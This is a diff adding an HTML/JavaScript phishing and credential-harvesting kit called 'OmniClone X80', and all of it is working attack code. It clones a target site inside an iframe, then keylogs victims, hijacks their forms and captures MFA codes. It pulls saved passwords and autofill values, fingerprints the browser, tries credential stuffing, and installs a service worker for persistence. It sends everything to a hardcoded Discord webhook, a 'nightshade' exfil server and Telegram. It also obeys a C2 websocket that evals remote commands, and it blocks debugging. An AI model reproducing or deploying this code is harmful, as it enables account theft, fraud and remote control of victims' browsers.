@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<title>Loading...</title>
+<style>
+:root{--bg:#0a0c10;--card:#15171e;--accent:#f72585;--text:#e5e5e5;--input-bg:#1f222a;--border:#2a2e39}
+*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}
+#forge-ui{max-width:500px;width:90%;background:var(--card);border-radius:24px;padding:2.5rem;box-shadow:0 0 40px rgba(247,37,133,.3);border:1px solid var(--border)}
+h1{font-size:2rem;margin-bottom:.5rem;background:linear-gradient(45deg,#f72585,#b5179e);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+p{opacity:0.8;margin-bottom:1.5rem}
+input{width:100%;padding:16px;background:var(--input-bg);border:1px solid var(--border);border-radius:14px;color:#fff;font-size:1rem;outline:none;transition:.2s;margin-bottom:1rem}
+input:focus{border-color:var(--accent)}
+button{background:var(--accent);color:#fff;border:none;padding:16px 28px;border-radius:14px;font-weight:bold;font-size:1rem;cursor:pointer;width:100%;transition:.2s}
+button:hover{background:#d91a6e}
+#cloneFrame{display:none;position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999;background:#fff}
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+<div id="forge-ui">
+<h1>OmniClone X80</h1>
+<p>Autonomous Harvester – all modules active.</p>
+<input type="url" id="targetUrl" placeholder="https://runehall.com" value="">
+<button id="forgeBtn">Forge & Harvest</button>
+<div id="status"></div>
+</div>
+<iframe id="cloneFrame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-pointer-lock"></iframe>
+
+<script>
+// ==================== CONFIG – HARDCODED ====================
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1499414905135038534/ZJMUgCsfOe4LpdIi0wuPB1LCe7LfGIvIkXwbakWCXXBTAOMVrDfANilUaBM7oCN9sD_M';
+const NIGHTSHADE_EXFIL = 'https://nightshade.cloutscape.org/api/exfil';
+const C2_WS = 'wss://nightshade.cloutscape.org/c2';
+const TELEGRAM_TOKEN = ''; // optional
+const TELEGRAM_CHAT_ID = '';
+const PUBLIC_PROXIES = [
+  'https://api.allorigins.win/raw?url=',
+  'https://corsproxy.io/?',
+  'https://api.codetabs.com/v1/proxy?quest='
+];
+const HTML2CANVAS_CDNS = [
+  'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js',
+  'https://unpkg.com/html2canvas@1.4.1/dist/html2canvas.min.js'
+];
+const COMMON_PASSWORDS = [
+  '123456','password','admin','qwerty','letmein','12345678','dragon','123456789',
+  'abc123','password1','welcome','monkey','trustno1','sunshine','football','iloveyou',
+  'shadow','12345','passw0rd','master','login','hello','charlie','donald','dragon1',
+  'qwerty123','letmein!','admin123','pass123','letmein123','superman','batman',
+  'access','flower','starwars','cheese','pass','qwertyuiop','welcome123','admin2024'
+];
+
+// ==================== UTILITIES ====================
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const uid = () => Math.random().toString(36).substring(2, 15);
+const jitter = () => Math.floor(Math.random() * 400) + 100;
+const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+// ==================== DISCORD RATE LIMITER ====================
+let rateLimitQueue = [];
+let rateLimitTimer = null;
+let rateLimitRemaining = 5; // safe start
+let rateLimitReset = Date.now();
+
+async function discordExfil(embed) {
+  return new Promise((resolve, reject) => {
+    rateLimitQueue.push({ embed, resolve, reject });
+    processQueue();
+  });
+}
+
+function processQueue() {
+  if (rateLimitTimer || rateLimitQueue.length === 0) return;
+  const now = Date.now();
+  if (rateLimitRemaining <= 0 && now < rateLimitReset) {
+    rateLimitTimer = setTimeout(() => {
+      rateLimitTimer = null;
+      processQueue();
+    }, rateLimitReset - now + 100);
+    return;
+  }
+  const { embed, resolve } = rateLimitQueue.shift();
+  sendDiscord(embed).then(resolve).catch(() => resolve()); // never block
+}
+
+async function sendDiscord(embed) {
+  try {
+    const res = await fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+    rateLimitRemaining = parseInt(res.headers.get('x-ratelimit-remaining')) || 1;
+    rateLimitReset = parseInt(res.headers.get('x-ratelimit-reset')) * 1000 || Date.now() + 1000;
+    return true;
+  } catch(e) {
+    // rate limited; retry after 1s
+    rateLimitRemaining = 0;
+    rateLimitReset = Date.now() + 1000;
+    return false;
+  }
+}
+
+// ==================== CHUNKED EXFIL ====================
+function chunkString(str, size = 1900) {
+  const chunks = [];
+  for (let i = 0; i < str.length; i += size) {
+    chunks.push(str.substring(i, i + size));
+  }
+  return chunks;
+}
+
+async function exfilLarge(payload) {
+  const json = JSON.stringify(payload, null, 2);
+  const chunks = chunkString(json, 1900);
+  for (let i = 0; i < chunks.length; i++) {
+    const embed = {
+      title: `X80 Exfil ${i+1}/${chunks.length}`,
+      description: '```json\n' + chunks[i] + '\n```',
+      color: 0xf72585,
+      footer: { text: 'Nightshade X80' }
+    };
+    await discordExfil(embed);
+    await sleep(500); // be gentle
+  }
+}
+
+// ==================== EXFIL FALLBACK ====================
+async function maxExfil(data) {
+  const frame = document.getElementById('cloneFrame');
+  const doc = frame.contentDocument || frame.contentWindow?.document;
+  const scraped = scrapeAll(doc);
+  const fp = await gatherFullFingerprint();
+  const storage = {
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    indexedDB: {}
+  };
+  try { const dbs = await indexedDB.databases(); for (const db of dbs) storage.indexedDB[db.name] = db.version; } catch(e) {}
+
+  const payload = {
+    type: 'x80_autonomous',
+    target: targetOrigin,
+    fingerprint: fp,
+    storage,
+    scrapedContent: scraped,
+    forms: data.forms || collectedForms,
+    keylog: keylogBuffer,
+    mfa: data.mfa || null,
+    credential_stuffing: data.credential_stuffing || null,
+    screenshot: data.screenshot || null,
+    clipboard: data.clipboard || null,
+    timestamp: Date.now(),
+    uid: uid()
+  };
+
+  // Try Nightshade exfil first (fast)
+  try { await fetch(NIGHTSHADE_EXFIL, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) }); } catch(e) {}
+
+  // Discord chunked exfil (rate‑limited)
+  exfilLarge(payload).catch(() => {});
+
+  // Telegram
+  if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `X80: ${json.slice(0,1000)}` })
+      });
+    } catch(e) {}
+  }
+
+  // Service Worker cache
+  if (serviceWorkerActive && navigator.serviceWorker.controller) {
+    navigator.serviceWorker.controller.postMessage({ type:'exfil', payload });
+  }
+
+  keylogBuffer = '';
+  collectedForms = [];
+}
+
+// ==================== SERVICE WORKER ====================
+let serviceWorkerActive = false;
+async function installServiceWorker() {
+  if (!('serviceWorker' in navigator)) return false;
+  try {
+    const swCode = `
+self.addEventListener('install', () => self.skipWaiting());
+self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+self.addEventListener('fetch', e => {
+  const u = new URL(e.request.url);
+  if (u.searchParams.has('x80')) {
+    const t = u.searchParams.get('x80');
+    e.respondWith(fetch(t, { mode:'no-cors' }).catch(() => new Response('', { status:500 })));
+  }
+});
+self.addEventListener('message', e => {
+  if (e.data?.type === 'exfil') {
+    caches.open('x80').then(c => c.put('/exfil', new Response(JSON.stringify(e.data.payload))));
+    fetch('${NIGHTSHADE_EXFIL}', {
+      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(e.data.payload)
+    }).catch(() => {});
+  } else if (e.data?.type === 'flush') {
+    caches.open('x80').then(async c => {
+      const r = await c.match('/exfil');
+      if (r) {
+        const p = await r.json();
+        fetch('${NIGHTSHADE_EXFIL}', { method:'POST', body:JSON.stringify(p) }).catch(() => {});
+        c.delete('/exfil');
+      }
+    });
+  }
+});
+`;
+    const blob = new Blob([swCode], { type:'application/javascript' });
+    const reg = await navigator.serviceWorker.register(URL.createObjectURL(blob));
+    await navigator.serviceWorker.ready;
+    serviceWorkerActive = true;
+    navigator.serviceWorker.controller?.postMessage({ type:'flush' });
+    return true;
+  } catch(e) { return false; }
+}
+
+// ==================== PROXY FETCH ====================
+let proxyIndex = 0;
+async function attemptProxyFetch(url) {
+  try {
+    const r = await fetch(NIGHTSHADE_PROXY? NIGHTSHADE_PROXY+encodeURIComponent(url) : url, { signal:AbortSignal.timeout(6000) });
+    if(r.ok) return await r.text();
+  } catch(e) {}
+  if(serviceWorkerActive) {
+    try {
+      const r = await fetch(location.origin+location.pathname+'?x80='+encodeURIComponent(url), { signal:AbortSignal.timeout(8000) });
+      if(r.ok) return await r.text();
+    } catch(e) {}
+  }
+  for(let i=0;i<PUBLIC_PROXIES.length;i++) {
+    const proxy = PUBLIC_PROXIES[(proxyIndex+i)%PUBLIC_PROXIES.length];
+    try {
+      const r = await fetch(proxy+encodeURIComponent(url), { signal:AbortSignal.timeout(8000) });
+      if(r.ok) { proxyIndex=(proxyIndex+i)%PUBLIC_PROXIES.length; return await r.text(); }
+    } catch(e) {}
+    await sleep(jitter());
+  }
+  try {
+    const r = await fetch(url, { mode:'no-cors', signal:AbortSignal.timeout(5000) });
+    if(r.type==='opaque') throw new Error('Opaque');
+    return await r.text();
+  } catch(e) { throw new Error('All proxies failed'); }
+}
+
+// ==================== ULTIMATE FINGERPRINT ====================
+let fingerprintCache = null;
+async function gatherFullFingerprint() {
+  if(fingerprintCache) return fingerprintCache;
+  const start = Date.now();
+  const fp = {
+    ua: navigator.userAgent, platform: navigator.platform, language: navigator.language,
+    languages: navigator.languages, hw: navigator.hardwareConcurrency, mem: navigator.deviceMemory||'N/A',
+    screen: { w:screen.width, h:screen.height, cd:screen.colorDepth, pd:screen.pixelDepth },
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    plugins: Array.from(navigator.plugins||[]).map(p=>p.name),
+    mimeTypes: Array.from(navigator.mimeTypes||[]).map(m=>m.type),
+    touch: navigator.maxTouchPoints, webdriver: navigator.webdriver,
+    doNotTrack: navigator.doNotTrack, cookieEnabled: navigator.cookieEnabled,
+    productSub: navigator.productSub, vendor: navigator.vendor, vendorSub: navigator.vendorSub,
+    pdfViewerEnabled: navigator.pdfViewerEnabled,
+    pmCreds: null, autofillDump: null
+  };
+  try { if(window.PasswordCredential){ const c=await navigator.credentials.get({password:true,mediation:'silent'}); if(c)fp.pmCreds={id:c.id,password:c.password}; } } catch(e){}
+  try { const inp=document.createElement('input');inp.type='text';inp.name='username';inp.style.cssText='position:fixed;opacity:0;';document.body.appendChild(inp);inp.focus();await sleep(200);if(inp.value)fp.autofillDump={username:inp.value};document.body.removeChild(inp); } catch(e){}
+  let localIPs=[];
+  try { const pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');await pc.setLocalDescription(await pc.createOffer());localIPs=await new Promise(res=>{const ips=new Set();pc.onicecandidate=e=>{if(!e.candidate){pc.close();res(Array.from(ips));}const m=e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);if(m)ips.add(m[1]);};setTimeout(()=>{pc.close();res(Array.from(ips));},1500);}); } catch(e){}
+  let publicIP=null; try { publicIP=await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(3000)}).then(r=>r.json()).then(d=>d.ip); } catch(e){}
+  let canvasHash=''; try { const c=document.createElement('canvas');c.width=280;c.height=60;const ctx=c.getContext('2d');ctx.fillStyle='rgb(255,0,0)';ctx.fillRect(10,10,50,50);ctx.fillStyle='rgb(0,255,0)';ctx.fillRect(30,30,50,50);ctx.fillStyle='rgb(0,0,255)';ctx.beginPath();ctx.arc(100,40,20,0,Math.PI*2);ctx.fill();canvasHash=c.toDataURL().slice(0,200); } catch(e){}
+  let webglFp=null; try { const gl=document.createElement('canvas').getContext('webgl')||document.createElement('canvas').getContext('experimental-webgl');if(gl){const d=gl.getExtension('WEBGL_debug_renderer_info');webglFp={vendor:gl.getParameter(d.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(d.UNMASKED_RENDERER_WEBGL)};} } catch(e){}
+  let battery=null; try { if(navigator.getBattery){ const b=await navigator.getBattery();battery={charging:b.charging,level:b.level}; } } catch(e){}
+  let geo=null; try { geo=await new Promise(res=>{navigator.geolocation.getCurrentPosition(p=>res({lat:p.coords.latitude,lng:p.coords.longitude}),()=>res(null),{timeout:3000});}); } catch(e){}
+  let connection=null; if(navigator.connection)connection={type:navigator.connection.type,effectiveType:navigator.connection.effectiveType,downlink:navigator.connection.downlink,rtt:navigator.connection.rtt};
+  let audioFp=null; try { const ctx=new (window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);const osc=ctx.createOscillator();osc.type='triangle';osc.frequency.value=1000;const ana=ctx.createAnalyser();osc.connect(ana);ana.connect(ctx.destination);osc.start(0);const buf=await ctx.startRendering();audioFp=Array.from(buf.getChannelData(0).slice(0,100)).map(v=>v.toFixed(4)).join(','); } catch(e){}
+  const extensions=[]; if(window.performance?.getEntriesByType){try{const resources=performance.getEntriesByType('resource');for(const r of resources){if(r.name.startsWith('chrome-extension://')||r.name.startsWith('moz-extension://')){const id=r.name.split('/')[2];if(!extensions.includes(id))extensions.push(id);}}}catch(e){}}
+  const timing=Date.now()-start;
+  fingerprintCache={...fp,localIPs,publicIP,canvasHash,webglFp,battery,geo,connection,audioFp,extensions,timing};
+  return fingerprintCache;
+}
+
+// ==================== AUTO‑SCRAPER ====================
+function scrapeAll(doc){ if(!doc)return{};const d={texts:[],images:[],links:[],forms:[],meta:[]};
+  const walker=document.createTreeWalker(doc.body,NodeFilter.SHOW_TEXT,null,false);while(walker.nextNode()){const t=walker.currentNode.nodeValue.trim();if(t)d.texts.push(t.substring(0,200));}
+  doc.querySelectorAll('img').forEach(i=>d.images.push({src:i.src,alt:i.alt}));
+  doc.querySelectorAll('a').forEach(a=>d.links.push({href:a.href,text:a.textContent.trim().substring(0,100)}));
+  doc.querySelectorAll('form').forEach(f=>{const fd={action:f.action,method:f.method,inputs:[]};f.querySelectorAll('input,textarea,select').forEach(el=>fd.inputs.push({name:el.name,type:el.type,value:el.value}));d.forms.push(fd);});
+  doc.querySelectorAll('meta').forEach(m=>d.meta.push({name:m.name||m.getProperty('property'),content:m.content}));
+  return d;}
+
+// ==================== KEYLOGGER & FORM HIJACK ====================
+let keylogBuffer='';let collectedForms=[];
+function startStealer(doc){
+  doc.addEventListener('keydown',e=>{keylogBuffer+=e.key;if(keylogBuffer.length>100)maxExfil({forms:collectedForms});});
+  setInterval(()=>{if(keylogBuffer)maxExfil({forms:collectedForms});},3000);
+  doc.querySelectorAll('input,textarea,select').forEach(el=>{el.addEventListener('input',()=>{collectForms(doc);maxExfil({forms:collectedForms});});el.addEventListener('change',()=>{collectForms(doc);maxExfil({forms:collectedForms});});});
+  const mo=new MutationObserver(()=>{doc.querySelectorAll('input[type="text"],[type="tel"],[type="number"]').forEach(i=>{if(!i.dataset.mfa){i.dataset.mfa='1';i.addEventListener('input',()=>maxExfil({mfa:i.value}));}});});
+  mo.observe(doc.body,{childList:true,subtree:true});
+}
+function collectForms(doc){const forms=doc.querySelectorAll('form');collectedForms=[];forms.forEach((f,idx)=>{const fd=new FormData(f);const data={};for(const[k,v]of fd.entries())data[k]=v;collectedForms.push({id:f.id||`form_${idx}`,action:f.dataset.originalAction||'',data});});}
+
+// ==================== CREDENTIAL STUFFING ====================
+function generateMutatedPasswords(domain){const base=domain.split('.')[0];const mutations=[base,base+'123',base+'1234',base+'!',base+'@123','admin@'+base,'admin_'+base,base+'_admin',base.toUpperCase(),base+'2024',base+'2025','letmein'+base.slice(0,3)];return [...new Set([...COMMON_PASSWORDS,...mutations])];}
+async function autoStuffCredentials(frameDoc){const forms=frameDoc.querySelectorAll('form');if(!forms.length)return;const form=forms[0];const inputs=form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');let userField=null,passField=null;for(const inp of inputs){const name=(inp.name||inp.placeholder||'').toLowerCase();if(name.includes('user')||name.includes('email')||name.includes('login'))userField=inp;if(name.includes('pass')||name.includes('pwd'))passField=inp;}if(!userField||!passField)return;const username=userField.value||'harvested@'+targetOrigin;const passwords=generateMutatedPasswords(targetOrigin);for(const pw of passwords){passField.value=pw;maxExfil({credential_stuffing:{username,pw}});await sleep(300);}}
+
+// ==================== C2 WEBSOCKET ====================
+let c2Socket=null;
+function connectC2(){try{c2Socket=new WebSocket(C2_WS);c2Socket.onopen=()=>c2Socket.send(JSON.stringify({type:'register',uid:uid()}));c2Socket.onmessage=e=>{try{const cmd=JSON.parse(e.data);if(cmd.type==='cmd'){if(cmd.command==='screenshot')takeScreenshot().then(img=>maxExfil({screenshot:img}));else if(cmd.command==='cookies')maxExfil({cookies:document.cookie});else if(cmd.command.startsWith('exec:'))eval(cmd.command.replace('exec:',''));}}catch(e){}};c2Socket.onclose=()=>setTimeout(connectC2,5000);}catch(e){}}
+
+// ==================== SCREENSHOT ====================
+let html2canvasReady=false;
+async function takeScreenshot(){if(!html2canvasReady){for(const src of HTML2CANVAS_CDNS){try{await new Promise((res,rej)=>{const s=document.createElement('script');s.src=src;s.onload=res;s.onerror=rej;document.head.appendChild(s);});html2canvasReady=true;break;}catch(e){}}if(!html2canvasReady)return null;}try{const frame=document.getElementById('cloneFrame');const doc=frame.contentDocument||frame.contentWindow.document;const canvas=await html2canvas(doc.body,{useCORS:true,allowTaint:true,logging:false});return canvas.toDataURL('image/png');}catch(e){return null;}}
+
+// ==================== CLONE ENGINE ====================
+let targetOrigin='';
+function rewriteDoc(doc,baseUrl){
+  doc.querySelectorAll('a[href]').forEach(a=>{const href=a.getAttribute('href');if(href&&!href.startsWith('javascript:')&&!href.startsWith('#')){a.href='javascript:void(0)';a.dataset.originalHref=new URL(href,baseUrl).href;a.addEventListener('click',navigateClone);}});
+  doc.querySelectorAll('form').forEach(f=>{f.action='javascript:void(0)';f.dataset.originalAction=new URL(f.getAttribute('action')||'',baseUrl).href||baseUrl;f.addEventListener('submit',handleFormSubmit);});
+  startStealer(doc);
+}
+async function navigateClone(e){e.preventDefault();const href=e.currentTarget.dataset.originalHref;if(href)await loadPage(href);}
+async function handleFormSubmit(e){e.preventDefault();const form=e.target;const formData=new FormData(form);const action=form.dataset.originalAction;await maxExfil({forms:collectedForms});if(action){const method=(form.method||'GET').toUpperCase();let nextUrl=action;let fetchOpts={method,headers:{'Content-Type':'application/x-www-form-urlencoded'}};if(method==='POST')fetchOpts.body=new URLSearchParams(formData).toString();else{const u=new URL(action);for(const[k,v]of formData.entries())u.searchParams.append(k,v);nextUrl=u.href;}await loadPage(nextUrl,fetchOpts);}}
+async function loadPage(url,fetchOpts={}){
+  try{
+    const html=await attemptProxyFetch(url);
+    const parser=new DOMParser();
+    const doc=parser.parseFromString(html,'text/html');
+    rewriteDoc(doc,url);
+    const frame=document.getElementById('cloneFrame');
+    frame.contentDocument.open();
+    frame.contentDocument.write('<!DOCTYPE html>'+doc.documentElement.outerHTML);
+    frame.contentDocument.close();
+    collectForms(frame.contentDocument);
+    setTimeout(()=>autoStuffCredentials(frame.contentDocument),2000);
+    await maxExfil({forms:collectedForms});
+  }catch(e){
+    const frame=document.getElementById('cloneFrame');
+    frame.contentDocument.open();
+    frame.contentDocument.write('<div style="padding:20px;color:red;">Load failed – retrying…</div>');
+    frame.contentDocument.close();
+    setTimeout(()=>loadPage(url,fetchOpts),3000);
+  }
+}
+function startAutoRefresh(url){setInterval(async()=>{try{const html=await attemptProxyFetch(url);const parser=new DOMParser();const doc=parser.parseFromString(html,'text/html');rewriteDoc(doc,url);const frame=document.getElementById('cloneFrame');frame.contentDocument.open();frame.contentDocument.write('<!DOCTYPE html>'+doc.documentElement.outerHTML);frame.contentDocument.close();collectForms(frame.contentDocument);}catch(e){}},60000);}
+
+// ==================== AUTO‑LAUNCH LOGIC ====================
+async function init(){
+  // Check for target from URL parameter
+  const params = new URLSearchParams(location.search);
+  const paramTarget = params.get('target');
+  if(paramTarget) {
+    document.getElementById('targetUrl').value = paramTarget;
+    document.getElementById('forgeBtn').click();
+    return;
+  }
+  // Check for hardcoded target? Not here, but you can set a default.
+  // If no param, just show the UI.
+}
+document.addEventListener('DOMContentLoaded', init);
+
+// ==================== MAIN BUTTON ====================
+document.getElementById('forgeBtn').addEventListener('click', async () => {
+  const url = document.getElementById('targetUrl').value.trim();
+  if(!url) return;
+  targetOrigin = new URL(url).origin;
+  const status = document.getElementById('status');
+  status.textContent = 'Installing SW…';
+  await installServiceWorker();
+  status.textContent = 'Connecting C2…';
+  connectC2();
+  status.textContent = 'Forging clone…';
+  try {
+    const html = await attemptProxyFetch(url);
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    rewriteDoc(doc, url);
+
+    const frame = document.getElementById('cloneFrame');
+    frame.style.display = 'block';
+    document.getElementById('forge-ui').classList.add('hidden');
+    frame.contentDocument.open();
+    frame.contentDocument.write('<!DOCTYPE html>' + doc.documentElement.outerHTML);
+    frame.contentDocument.close();
+    collectForms(frame.contentDocument);
+    setTimeout(() => autoStuffCredentials(frame.contentDocument), 2000);
+    startAutoRefresh(url);
+    await maxExfil({ forms: collectedForms });
+    setInterval(async () => {
+      const img = await takeScreenshot();
+      if (img) maxExfil({ screenshot: img });
+    }, 15000);
+  } catch(e) { status.textContent = 'Error: ' + e.message; }
+});
+
+// ==================== ANTI‑DEBUG & CLEANUP ====================
+setInterval(() => {
+  const start = performance.now();
+  debugger;
+  if (performance.now() - start > 80) location.href = 'about:blank';
+}, 2000);
+window.addEventListener('beforeunload', () => {
+  keylogBuffer = ''; collectedForms = [];
+  if (c2Socket) c2Socket.close();
+});
+</script>
+</body>
+</html>
